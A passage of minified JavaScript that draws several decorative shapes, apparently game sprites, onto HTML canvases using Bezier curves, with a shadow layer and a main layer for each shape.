                    r.moveTo(212.5 * e, 270.0625 * e),
                    r.bezierCurveTo(235 * e, 261.5625 * e, 235 * e, 261.5625 * e, 257.5 * e, 253.0625 * e),
                    r.closePath(),
                    he(r, void 0, i[0], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(193.5 * e, 226.0625 * e),
                    r.bezierCurveTo(204.5 * e, 242.0625 * e, 242.5 * e, 237.0625 * e, 251.5 * e, 225.0625 * e),
                    r.bezierCurveTo(246.5 * e, 195.0625 * e, 205.5 * e, 190.0625 * e, 193.5 * e, 227.0625 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(164.5 * e, 245.0625 * e),
                    r.bezierCurveTo(182.5 * e, 264.0625 * e, 252.5 * e, 258.0625 * e, 276.5 * e, 244.0625 * e),
                    r.bezierCurveTo(265.5 * e, 226.0625 * e, 244.5 * e, 231.0625 * e, 229.5 * e, 230.0625 * e),
                    r.bezierCurveTo(205.5 * e, 227.0625 * e, 175.5 * e, 202.0625 * e, 162.5 * e, 244.0625 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115.5 * e, 260.0625 * e),
                    r.bezierCurveTo(134.5 * e, 279.0625 * e, 170.5 * e, 275.0625 * e, 191.5 * e, 257.0625 * e),
                    r.bezierCurveTo(174.5 * e, 208.0625 * e, 142.5 * e, 197.0625 * e, 116.5 * e, 259.0625 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(152.5 * e, 278.0625 * e),
                    r.bezierCurveTo(165.5 * e, 294.0625 * e, 200.5 * e, 287.0625 * e, 216.5 * e, 278.0625 * e),
                    r.bezierCurveTo(206.5 * e, 247.0625 * e, 173.5 * e, 233.0625 * e, 153.5 * e, 276.0625 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 12 * e),
                    n
            }
            function C0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 272 * e,
                    n.height = 264 * e,
                    r.translate(0, 20 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56.999969482421875 * e, 84.517333984375 * e),
                    r.bezierCurveTo(61.999969482421875 * e, 58.517333984375 * e, 79.99996948242188 * e, 50.517333984375 * e, 102.99996948242188 * e, 50.517333984375 * e),
                    r.bezierCurveTo(119.99996948242188 * e, 26.517333984375 * e, 137.99996948242188 * e, 32.517333984375 * e, 156.99996948242188 * e, 44.517333984375 * e),
                    r.bezierCurveTo(187.99996948242188 * e, 42.517333984375 * e, 195.99996948242188 * e, 50.517333984375 * e, 202.99996948242188 * e, 77.517333984375 * e),
                    r.bezierCurveTo(229.99996948242188 * e, 80.517333984375 * e, 231.99996948242188 * e, 96.517333984375 * e, 229.99996948242188 * e, 118.517333984375 * e),
                    r.bezierCurveTo(241.99996948242188 * e, 147.517333984375 * e, 236.99996948242188 * e, 148.517333984375 * e, 220.99996948242188 * e, 165.517333984375 * e),
                    r.bezierCurveTo(222.99996948242188 * e, 192.517333984375 * e, 209.99996948242188 * e, 212.517333984375 * e, 177.99996948242188 * e, 213.517333984375 * e),
                    r.bezierCurveTo(159.99996948242188 * e, 234.517333984375 * e, 141.99996948242188 * e, 234.517333984375 * e, 116.99996948242188 * e, 222.517333984375 * e),
                    r.bezierCurveTo(72.99996948242188 * e, 226.517333984375 * e, 66.99996948242188 * e, 207.517333984375 * e, 65.99996948242188 * e, 190.517333984375 * e),
                    r.bezierCurveTo(35.999969482421875 * e, 180.517333984375 * e, 30.999969482421875 * e, 162.517333984375 * e, 39.999969482421875 * e, 135.517333984375 * e),
                    r.bezierCurveTo(23.999969482421875 * e, 110.517333984375 * e, 43.999969482421875 * e, 90.517333984375 * e, 55.999969482421875 * e, 85.517333984375 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(0, -20 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56.999969482421875 * e, 84.517333984375 * e),
                    r.bezierCurveTo(61.999969482421875 * e, 58.517333984375 * e, 79.99996948242188 * e, 50.517333984375 * e, 102.99996948242188 * e, 50.517333984375 * e),
                    r.bezierCurveTo(119.99996948242188 * e, 26.517333984375 * e, 137.99996948242188 * e, 32.517333984375 * e, 156.99996948242188 * e, 44.517333984375 * e),
                    r.bezierCurveTo(187.99996948242188 * e, 42.517333984375 * e, 195.99996948242188 * e, 50.517333984375 * e, 202.99996948242188 * e, 77.517333984375 * e),
                    r.bezierCurveTo(229.99996948242188 * e, 80.517333984375 * e, 231.99996948242188 * e, 96.517333984375 * e, 229.99996948242188 * e, 118.517333984375 * e),
                    r.bezierCurveTo(241.99996948242188 * e, 147.517333984375 * e, 236.99996948242188 * e, 148.517333984375 * e, 220.99996948242188 * e, 165.517333984375 * e),
                    r.bezierCurveTo(222.99996948242188 * e, 192.517333984375 * e, 209.99996948242188 * e, 212.517333984375 * e, 177.99996948242188 * e, 213.517333984375 * e),
                    r.bezierCurveTo(159.99996948242188 * e, 234.517333984375 * e, 141.99996948242188 * e, 234.517333984375 * e, 116.99996948242188 * e, 222.517333984375 * e),
                    r.bezierCurveTo(72.99996948242188 * e, 226.517333984375 * e, 66.99996948242188 * e, 207.517333984375 * e, 65.99996948242188 * e, 190.517333984375 * e),
                    r.bezierCurveTo(35.999969482421875 * e, 180.517333984375 * e, 30.999969482421875 * e, 162.517333984375 * e, 39.999969482421875 * e, 135.517333984375 * e),
                    r.bezierCurveTo(23.999969482421875 * e, 110.517333984375 * e, 43.999969482421875 * e, 90.517333984375 * e, 55.999969482421875 * e, 85.517333984375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(123.99996948242188 * e, 116.18402099609375 * e),
                    r.bezierCurveTo(115.99996948242188 * e, 99.18402099609375 * e, 109.99996948242188 * e, 74.18402099609375 * e, 109.99996948242188 * e, 63.18402099609375 * e),
                    r.bezierCurveTo(115.99996948242188 * e, 69.18402099609375 * e, 125.99996948242188 * e, 87.18402099609375 * e, 137.99996948242188 * e, 112.18402099609375 * e),
                    r.bezierCurveTo(142.99996948242188 * e, 84.18402099609375 * e, 143.99996948242188 * e, 76.18402099609375 * e, 153.99996948242188 * e, 62.18402099609375 * e),
                    r.bezierCurveTo(155.99996948242188 * e, 79.18402099609375 * e, 149.99996948242188 * e, 110.18402099609375 * e, 151.99996948242188 * e, 117.18402099609375 * e),
                    r.bezierCurveTo(162.99996948242188 * e, 104.18402099609375 * e, 180.99996948242188 * e, 91.18402099609375 * e, 191.99996948242188 * e, 91.18402099609375 * e),
                    r.bezierCurveTo(185.99996948242188 * e, 102.18402099609375 * e, 180.99996948242188 * e, 106.18402099609375 * e, 160.99996948242188 * e, 124.18402099609375 * e),
                    r.bezierCurveTo(190.99996948242188 * e, 121.18402099609375 * e, 199.99996948242188 * e, 120.18402099609375 * e, 207.99996948242188 * e, 123.18402099609375 * e),
                    r.bezierCurveTo(199.99996948242188 * e, 129.18402099609375 * e, 181.99996948242188 * e, 132.18402099609375 * e, 160.99996948242188 * e, 135.18402099609375 * e),
                    r.bezierCurveTo(179.99996948242188 * e, 142.18402099609375 * e, 193.99996948242188 * e, 151.18402099609375 * e, 196.99996948242188 * e, 156.18402099609375 * e),
                    r.bezierCurveTo(185.99996948242188 * e, 156.18402099609375 * e, 163.99996948242188 * e, 149.18402099609375 * e, 152.99996948242188 * e, 147.18402099609375 * e),
                    r.bezierCurveTo(157.99996948242188 * e, 155.18402099609375 * e, 165.99996948242188 * e, 176.18402099609375 * e, 169.99996948242188 * e, 195.18402099609375 * e),
                    r.bezierCurveTo(162.99996948242188 * e, 190.18402099609375 * e, 147.99996948242188 * e, 167.18402099609375 * e, 139.99996948242188 * e, 153.18402099609375 * e),
                    r.bezierCurveTo(137.99996948242188 * e, 167.18402099609375 * e, 126.99996948242188 * e, 194.18402099609375 * e, 119.99996948242188 * e, 204.18402099609375 * e),
                    r.bezierCurveTo(117.99996948242188 * e, 186.18402099609375 * e, 123.99996948242188 * e, 165.18402099609375 * e, 126.99996948242188 * e, 149.18402099609375 * e),
                    r.bezierCurveTo(110.99996948242188 * e, 163.18402099609375 * e, 103.99996948242188 * e, 170.18402099609375 * e, 82.99996948242188 * e, 177.18402099609375 * e),
                    r.bezierCurveTo(90.99996948242188 * e, 162.18402099609375 * e, 99.99996948242188 * e, 153.18402099609375 * e, 117.99996948242188 * e, 140.18402099609375 * e),
                    r.bezierCurveTo(97.99996948242188 * e, 140.18402099609375 * e, 83.99996948242188 * e, 139.18402099609375 * e, 65.99996948242188 * e, 132.18402099609375 * e),
                    r.bezierCurveTo(77.99996948242188 * e, 127.18402099609375 * e, 95.99996948242188 * e, 127.18402099609375 * e, 115.99996948242188 * e, 127.18402099609375 * e),
                    r.bezierCurveTo(91.99996948242188 * e, 113.18402099609375 * e, 84.99996948242188 * e, 107.18402099609375 * e, 76.99996948242188 * e, 96.18402099609375 * e),
                    r.bezierCurveTo(94.99996948242188 * e, 99.18402099609375 * e, 109.99996948242188 * e, 109.18402099609375 * e, 123.99996948242188 * e, 116.18402099609375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(131.99996948242188 * e, 119.18402099609375 * e),
                    r.bezierCurveTo(141.99996948242188 * e, 119.18402099609375 * e, 145.99996948242188 * e, 116.18402099609375 * e, 147.99996948242188 * e, 109.18402099609375 * e),
                    r.bezierCurveTo(151.99996948242188 * e, 107.18402099609375 * e, 159.99996948242188 * e, 107.18402099609375 * e, 156.99996948242188 * e, 123.18402099609375 * e),
                    r.bezierCurveTo(155.99996948242188 * e, 140.18402099609375 * e, 142.99996948242188 * e, 149.18402099609375 * e, 132.99996948242188 * e, 147.18402099609375 * e),
                    r.bezierCurveTo(119.99996948242188 * e, 144.18402099609375 * e, 113.99996948242188 * e, 122.18402099609375 * e, 131.99996948242188 * e, 119.18402099609375 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 6 * e),
                    n
            }
            function b0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 247 * e,
                    n.height = 247 * e,
                    r.translate(0, 10 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(150 * e, 62 * e),
                    r.bezierCurveTo(151.5 * e, 71.5 * e, 149 * e, 70 * e, 153 * e, 81 * e),
                    r.bezierCurveTo(158 * e, 73.5 * e, 158 * e, 73.5 * e, 163 * e, 66 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(164 * e, 171 * e),
                    r.bezierCurveTo(149 * e, 159 * e, 156.5 * e, 165 * e, 149 * e, 159 * e),
                    r.bezierCurveTo(149 * e, 167 * e, 149 * e, 170 * e, 152 * e, 178 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(132 * e, 95 * e),
                    r.bezierCurveTo(154 * e, 102 * e, 154 * e, 126 * e, 137 * e, 139 * e),
                    r.bezierCurveTo(113 * e, 152 * e, 89 * e, 136 * e, 80 * e, 121 * e),
                    r.bezierCurveTo(57 * e, 89 * e, 69 * e, 63 * e, 79 * e, 52 * e),
                    r.bezierCurveTo(110 * e, 20 * e, 139 * e, 21 * e, 150 * e, 25 * e),
                    r.bezierCurveTo(197 * e, 36 * e, 221 * e, 67 * e, 226 * e, 90 * e),
                    r.bezierCurveTo(234 * e, 134 * e, 214 * e, 177 * e, 195 * e, 197 * e),
                    r.bezierCurveTo(144 * e, 242 * e, 79 * e, 216 * e, 58 * e, 206 * e),
                    r.bezierCurveTo(13 * e, 174 * e, 20 * e, 134 * e, 23 * e, 107 * e),
                    r.bezierCurveTo(26 * e, 78 * e, 33 * e, 60 * e, 38 * e, 43 * e),
                    r.bezierCurveTo(42 * e, 32 * e, 47 * e, 32 * e, 50 * e, 36 * e),
                    r.bezierCurveTo(54 * e, 37 * e, 50 * e, 52 * e, 44 * e, 87 * e),
                    r.bezierCurveTo(40 * e, 115 * e, 46 * e, 142 * e, 57 * e, 158 * e),
                    r.bezierCurveTo(76 * e, 189 * e, 129 * e, 182 * e, 152 * e, 173 * e),
                    r.bezierCurveTo(186 * e, 156 * e, 191 * e, 106 * e, 176 * e, 85 * e),
                    r.bezierCurveTo(159 * e, 61 * e, 132 * e, 62 * e, 122 * e, 66 * e),
                    r.bezierCurveTo(108 * e, 74 * e, 108 * e, 89 * e, 116 * e, 90 * e),
                    r.bezierCurveTo(123 * e, 92 * e, 130 * e, 93 * e, 131 * e, 94 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(0, -10 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(150 * e, 62 * e),
                    r.bezierCurveTo(151.5 * e, 71.5 * e, 149 * e, 70 * e, 153 * e, 81 * e),
                    r.bezierCurveTo(158 * e, 73.5 * e, 158 * e, 73.5 * e, 163 * e, 66 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(164 * e, 171 * e),
                    r.bezierCurveTo(149 * e, 159 * e, 156.5 * e, 165 * e, 149 * e, 159 * e),
                    r.bezierCurveTo(149 * e, 167 * e, 149 * e, 170 * e, 152 * e, 178 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(132 * e, 95 * e),
                    r.bezierCurveTo(154 * e, 102 * e, 154 * e, 126 * e, 137 * e, 139 * e),
                    r.bezierCurveTo(113 * e, 152 * e, 89 * e, 136 * e, 80 * e, 121 * e),
                    r.bezierCurveTo(57 * e, 89 * e, 69 * e, 63 * e, 79 * e, 52 * e),
                    r.bezierCurveTo(110 * e, 20 * e, 139 * e, 21 * e, 150 * e, 25 * e),
                    r.bezierCurveTo(197 * e, 36 * e, 221 * e, 67 * e, 226 * e, 90 * e),
                    r.bezierCurveTo(234 * e, 134 * e, 214 * e, 177 * e, 195 * e, 197 * e),
                    r.bezierCurveTo(144 * e, 242 * e, 79 * e, 216 * e, 58 * e, 206 * e),
                    r.bezierCurveTo(13 * e, 174 * e, 20 * e, 134 * e, 23 * e, 107 * e),
                    r.bezierCurveTo(26 * e, 78 * e, 33 * e, 60 * e, 38 * e, 43 * e),
                    r.bezierCurveTo(42 * e, 32 * e, 47 * e, 32 * e, 50 * e, 36 * e),
                    r.bezierCurveTo(54 * e, 37 * e, 50 * e, 52 * e, 44 * e, 87 * e),
                    r.bezierCurveTo(40 * e, 115 * e, 46 * e, 142 * e, 57 * e, 158 * e),
                    r.bezierCurveTo(76 * e, 189 * e, 129 * e, 182 * e, 152 * e, 173 * e),
                    r.bezierCurveTo(186 * e, 156 * e, 191 * e, 106 * e, 176 * e, 85 * e),
                    r.bezierCurveTo(159 * e, 61 * e, 132 * e, 62 * e, 122 * e, 66 * e),
                    r.bezierCurveTo(108 * e, 74 * e, 108 * e, 89 * e, 116 * e, 90 * e),
                    r.bezierCurveTo(123 * e, 92 * e, 130 * e, 93 * e, 131 * e, 94 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(137 * e, 137 * e),
                    r.bezierCurveTo(145 * e, 125 * e, 138 * e, 108 * e, 123 * e, 104 * e),
                    r.bezierCurveTo(81 * e, 101 * e, 88 * e, 77 * e, 98 * e, 65 * e),
                    r.bezierCurveTo(117 * e, 38 * e, 138 * e, 39 * e, 165 * e, 52 * e),
                    r.bezierCurveTo(197 * e, 72 * e, 207 * e, 111 * e, 197 * e, 140 * e),
                    r.bezierCurveTo(182 * e, 180 * e, 161 * e, 197 * e, 112 * e, 194 * e),
                    r.bezierCurveTo(58 * e, 194 * e, 37 * e, 170 * e, 34 * e, 142 * e),
                    r.bezierCurveTo(29 * e, 102 * e, 40 * e, 63 * e, 51 * e, 45 * e),
                    r.bezierCurveTo(43 * e, 78 * e, 41 * e, 103 * e, 43 * e, 122 * e),
                    r.bezierCurveTo(51 * e, 158 * e, 63 * e, 174 * e, 95 * e, 179 * e),
                    r.bezierCurveTo(129 * e, 186 * e, 169 * e, 172 * e, 177 * e, 144 * e),
                    r.bezierCurveTo(197 * e, 105 * e, 172 * e, 76 * e, 160 * e, 71 * e),
                    r.bezierCurveTo(125 * e, 52 * e, 111 * e, 73 * e, 111 * e, 81 * e),
                    r.bezierCurveTo(106 * e, 93 * e, 140 * e, 92 * e, 147 * e, 107 * e),
                    r.bezierCurveTo(153 * e, 128 * e, 140 * e, 135 * e, 137 * e, 139 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(132 * e, 95 * e),
                    r.bezierCurveTo(154 * e, 102 * e, 154 * e, 126 * e, 137 * e, 139 * e),
                    r.bezierCurveTo(113 * e, 152 * e, 89 * e, 136 * e, 80 * e, 121 * e),
                    r.bezierCurveTo(57 * e, 89 * e, 69 * e, 63 * e, 79 * e, 52 * e),
                    r.bezierCurveTo(110 * e, 20 * e, 139 * e, 21 * e, 150 * e, 25 * e),
                    r.bezierCurveTo(197 * e, 36 * e, 221 * e, 67 * e, 226 * e, 90 * e),
                    r.bezierCurveTo(234 * e, 134 * e, 214 * e, 177 * e, 195 * e, 197 * e),
                    r.bezierCurveTo(144 * e, 242 * e, 79 * e, 216 * e, 58 * e, 206 * e),
                    r.bezierCurveTo(13 * e, 174 * e, 20 * e, 134 * e, 23 * e, 107 * e),
                    r.bezierCurveTo(26 * e, 78 * e, 33 * e, 60 * e, 38 * e, 43 * e),
                    r.bezierCurveTo(42 * e, 32 * e, 47 * e, 32 * e, 50 * e, 36 * e),
                    r.bezierCurveTo(54 * e, 37 * e, 50 * e, 52 * e, 44 * e, 87 * e),
                    r.bezierCurveTo(40 * e, 115 * e, 46 * e, 142 * e, 57 * e, 158 * e),
                    r.bezierCurveTo(76 * e, 189 * e, 129 * e, 182 * e, 152 * e, 173 * e),
                    r.bezierCurveTo(186 * e, 156 * e, 191 * e, 106 * e, 176 * e, 85 * e),
                    r.bezierCurveTo(159 * e, 61 * e, 132 * e, 62 * e, 122 * e, 66 * e),
                    r.bezierCurveTo(108 * e, 74 * e, 108 * e, 89 * e, 116 * e, 90 * e),
                    r.bezierCurveTo(123 * e, 92 * e, 130 * e, 93 * e, 131 * e, 94 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(82 * e, 63 * e),
                    r.bezierCurveTo(91 * e, 64 * e, 96 * e, 62 * e, 98 * e, 53 * e),
                    r.bezierCurveTo(91 * e, 45 * e, 85 * e, 42 * e, 78 * e, 41 * e),
                    r.bezierCurveTo(81 * e, 51 * e, 82 * e, 57 * e, 82 * e, 63 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(148 * e, 40 * e),
                    r.bezierCurveTo(140 * e, 52 * e, 131 * e, 51 * e, 123 * e, 43 * e),
                    r.bezierCurveTo(123 * e, 25 * e, 129 * e, 17 * e, 134 * e, 12 * e),
                    r.bezierCurveTo(138 * e, 35 * e, 142 * e, 31 * e, 148 * e, 40 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(189 * e, 43 * e),
                    r.bezierCurveTo(191 * e, 54 * e, 196 * e, 58 * e, 205 * e, 59 * e),
                    r.bezierCurveTo(211 * e, 42 * e, 214 * e, 37 * e, 216 * e, 31 * e),
                    r.bezierCurveTo(202 * e, 34 * e, 195 * e, 39 * e, 190 * e, 43 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(216 * e, 98 * e),
                    r.bezierCurveTo(219 * e, 105 * e, 225 * e, 107 * e, 230 * e, 109 * e),
                    r.bezierCurveTo(227 * e, 113 * e, 221 * e, 115 * e, 215 * e, 115 * e),
                    r.bezierCurveTo(208 * e, 109 * e, 211 * e, 101 * e, 216 * e, 98 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(180 * e, 85 * e),
                    r.bezierCurveTo(193 * e, 86 * e, 196 * e, 98 * e, 191 * e, 108 * e),
                    r.bezierCurveTo(179 * e, 112 * e, 167 * e, 113 * e, 155 * e, 111 * e),
                    r.bezierCurveTo(169 * e, 100 * e, 176 * e, 96 * e, 180 * e, 85 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(96 * e, 114 * e),
                    r.bezierCurveTo(102 * e, 109 * e, 112 * e, 110 * e, 114 * e, 118 * e),
                    r.bezierCurveTo(111 * e, 134 * e, 102 * e, 143 * e, 95 * e, 147 * e),
                    r.bezierCurveTo(98 * e, 123 * e, 97 * e, 119 * e, 96 * e, 115 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(79 * e, 92 * e),
                    r.bezierCurveTo(86 * e, 95 * e, 89 * e, 102 * e, 83 * e, 111 * e),
                    r.bezierCurveTo(70 * e, 110 * e, 61 * e, 107 * e, 54 * e, 100 * e),
                    r.bezierCurveTo(70 * e, 97 * e, 70 * e, 95 * e, 78 * e, 92 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(39 * e, 130 * e),
                    r.bezierCurveTo(37 * e, 141 * e, 41 * e, 143 * e, 48 * e, 144 * e),
                    r.bezierCurveTo(54 * e, 134 * e, 55 * e, 131 * e, 56 * e, 123 * e),
                    r.bezierCurveTo(47 * e, 129 * e, 43 * e, 129 * e, 39 * e, 129 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(113 * e, 189 * e),
                    r.bezierCurveTo(119 * e, 201 * e, 127 * e, 198 * e, 134 * e, 192 * e),
                    r.bezierCurveTo(128 * e, 175 * e, 128 * e, 173 * e, 128 * e, 165 * e),
                    r.bezierCurveTo(117 * e, 176 * e, 116 * e, 182 * e, 113 * e, 187 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(74 * e, 154 * e),
                    r.bezierCurveTo(76 * e, 163 * e, 76 * e, 170 * e, 75 * e, 177 * e),
                    r.bezierCurveTo(68 * e, 179 * e, 66 * e, 176 * e, 63 * e, 171 * e),
                    r.bezierCurveTo(69 * e, 164 * e, 72 * e, 159 * e, 74 * e, 154 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(206 * e, 152 * e),
                    r.bezierCurveTo(198 * e, 158 * e, 198 * e, 166 * e, 201 * e, 171 * e),
                    r.bezierCurveTo(209 * e, 170 * e, 221 * e, 170 * e, 226 * e, 172 * e),
                    r.bezierCurveTo(219 * e, 159 * e, 210 * e, 155 * e, 207 * e, 153 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(181 * e, 184 * e),
                    r.bezierCurveTo(170 * e, 184 * e, 167 * e, 187 * e, 163 * e, 195 * e),
                    r.bezierCurveTo(171 * e, 207 * e, 183 * e, 214 * e, 191 * e, 217 * e),
                    r.bezierCurveTo(183 * e, 204 * e, 184 * e, 196 * e, 181 * e, 184 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(66 * e, 199 * e),
                    r.bezierCurveTo(73 * e, 197 * e, 78 * e, 199 * e, 79 * e, 206 * e),
                    r.bezierCurveTo(71 * e, 216 * e, 67 * e, 221 * e, 57 * e, 223 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(182 * e, 143 * e),
                    r.bezierCurveTo(183 * e, 146 * e, 183 * e, 149 * e, 179 * e, 152 * e),
                    r.bezierCurveTo(174 * e, 146 * e, 174 * e, 146 * e, 169 * e, 140 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(32 * e, 159 * e),
                    r.bezierCurveTo(45 * e, 160 * e, 48 * e, 164 * e, 45 * e, 175 * e),
                    r.bezierCurveTo(28 * e, 183 * e, 25 * e, 184 * e, 19 * e, 184 * e),
                    r.bezierCurveTo(30 * e, 170 * e, 29 * e, 164 * e, 31 * e, 160 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(110 * e, 214 * e),
                    r.bezierCurveTo(106 * e, 212 * e, 104 * e, 213 * e, 102 * e, 218 * e),
                    r.bezierCurveTo(104 * e, 220 * e, 107 * e, 222 * e, 110 * e, 224 * e),
                    r.bezierCurveTo(110.5 * e, 219 * e, 110.5 * e, 219 * e, 111 * e, 214 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(40 * e, 52 * e),
                    r.bezierCurveTo(41 * e, 57 * e, 40 * e, 61 * e, 34 * e, 60 * e),
                    r.bezierCurveTo(31.5 * e, 55 * e, 31.5 * e, 55 * e, 29 * e, 50 * e),
                    r.bezierCurveTo(34 * e, 50.5 * e, 34 * e, 50.5 * e, 39 * e, 51 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(31 * e, 81 * e),
                    r.bezierCurveTo(37 * e, 84 * e, 38 * e, 90 * e, 34 * e, 99 * e),
                    r.bezierCurveTo(23 * e, 97 * e, 19 * e, 96 * e, 16 * e, 93 * e),
                    r.bezierCurveTo(24 * e, 88 * e, 28 * e, 85 * e, 30 * e, 81 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    n
            }
            function N0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 465 * e,
                    n.height = 310 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(126 * e, 192 * e),
                    r.bezierCurveTo(198 * e, 202 * e, 245 * e, 203 * e, 335 * e, 194 * e),
                    r.bezierCurveTo(336 * e, 232 * e, 326 * e, 235 * e, 232 * e, 237 * e),
                    r.bezierCurveTo(161 * e, 235 * e, 122 * e, 235 * e, 126 * e, 193 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(146 * e, 239 * e),
                    r.bezierCurveTo(174 * e, 74 * e, 287 * e, 88 * e, 320 * e, 240 * e),
                    r.bezierCurveTo(329 * e, 231 * e, 340 * e, 219 * e, 332 * e, 115 * e),
                    r.bezierCurveTo(330 * e, 40 * e, 144 * e, 30 * e, 129 * e, 116 * e),
                    r.bezierCurveTo(124 * e, 217 * e, 124 * e, 228 * e, 143 * e, 237 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(126 * e, 193 * e),
                    r.bezierCurveTo(173 * e, 94 * e, 209 * e, 100 * e, 228 * e, 57 * e),
                    r.bezierCurveTo(190 * e, 112 * e, 165 * e, 115 * e, 127 * e, 184 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(230 * e, 57 * e),
                    r.bezierCurveTo(266 * e, 117 * e, 310 * e, 130 * e, 332 * e, 183 * e),
                    r.bezierCurveTo(290 * e, 112 * e, 262 * e, 109 * e, 230 * e, 56 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(154 * e, 212 * e),
                    r.bezierCurveTo(208 * e, 224 * e, 252 * e, 219 * e, 305 * e, 212 * e),
